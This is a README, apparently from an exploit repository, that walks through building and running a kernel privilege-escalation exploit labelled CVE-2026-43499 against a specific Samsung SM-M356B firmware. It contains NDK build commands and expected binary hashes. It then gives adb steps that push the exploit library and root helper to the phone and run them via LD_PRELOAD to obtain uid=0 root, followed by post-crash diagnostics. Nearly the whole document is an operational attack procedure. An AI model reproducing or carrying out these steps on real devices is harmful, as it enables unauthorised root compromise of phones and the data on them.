# SM-M356B M356BXXU8DZE3

This target is statically derived and is not hardware validated. Do not use an
older artifact after rebuilding; always verify the SHA-256 on the phone.

## Build on Linux

The repository Makefile requires Android NDK r27d or a compatible NDK. Keep the
NDK outside the repository. Example:

```sh
export ANDROID_NDK_HOME=/path/to/android-ndk-r27d
make clean all TARGET=m35x-M356BXXU8DZE3 API=35 OUTDIR=/tmp/m356b-build
make release TARGET=m35x-M356BXXU8DZE3 API=35 \
	OUTDIR=/tmp/m356b-build-release
```

The release app is produced at:

```text
/tmp/m356b-build-release/cve-2026-43499-app.release.so
```

The root helper is produced by the `all` build at:

```text
/tmp/m356b-build/cve-2026-43499-root
```

Audit the outputs before copying them:

```sh
file /tmp/m356b-build-release/cve-2026-43499-app.release.so
stat -c '%n %s bytes' /tmp/m356b-build-release/cve-2026-43499-app.release.so
sha256sum /tmp/m356b-build-release/cve-2026-43499-app.release.so \
	/tmp/m356b-build/cve-2026-43499-root
```

For the currently published candidate, expected hashes are:

```text
app:  cd6a760dc09af2ed643a60d9d3ca71d55d8a543ff1bff7711933e9a473e5bd5c
root: 8b7e3285e99cbef5c958d5512105ef0471179484d7a8cb834d23cc882d259fd1
```

## Test from Windows

Run the following commands in the Windows terminal where the phone is
connected. These commands do not flash or modify boot partitions.

```powershell
adb devices
adb shell getprop ro.product.model
adb shell getprop ro.build.version.incremental
adb shell uname -a
```

The expected identity is `SM-M356B`, `M356BXXU8DZE3`, and
`5.15.189-android13-3-33470412`.

Copy the two files from the Linux build to Windows, then verify them:

```powershell
Get-FileHash .\cve-2026-43499-app.so -Algorithm SHA256
Get-FileHash .\cve-2026-43499-root -Algorithm SHA256
```

Transfer them only after the hashes match:

```powershell
adb push .\cve-2026-43499-app.so /data/local/tmp/
adb push .\cve-2026-43499-root /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root"
adb shell "sha256sum /data/local/tmp/cve-2026-43499-app.so"
```

The phone-side app hash must match the expected app hash above. Only then run
one controlled attempt:

```powershell
adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

Success requires an explicit `uid=0(root)` result. Reaching
`writer-enter` is not success. If the phone reboots, stop immediately and
collect diagnostics instead of repeating the command:

```powershell
adb wait-for-device
adb shell getprop sys.boot.reason
adb shell getprop ro.boot.bootreason
adb shell getenforce
adb shell id
adb logcat -b all -d -v threadtime > m356b-logcat.txt
adb shell getprop > m356b-props.txt
adb shell "cat /proc/last_kmsg 2>/dev/null" > m356b-last-kmsg.txt
```

The current candidate uses the MCAST writer, direct fops route, post-fops pipe
order, and `MCAST_WAITER_OFF=0x28`. It has not completed a hardware run.

## Evidence

The exact M356B kernel, ELF, BTF and P0 fingerprint were recovered from the
official FUS firmware outside the repository. Critical symbol and layout
values were derived from those artifacts rather than copied from SM-A546E.
See `analysis/m356b/` for the evidence, comparison matrix, build report, and
handoff notes.
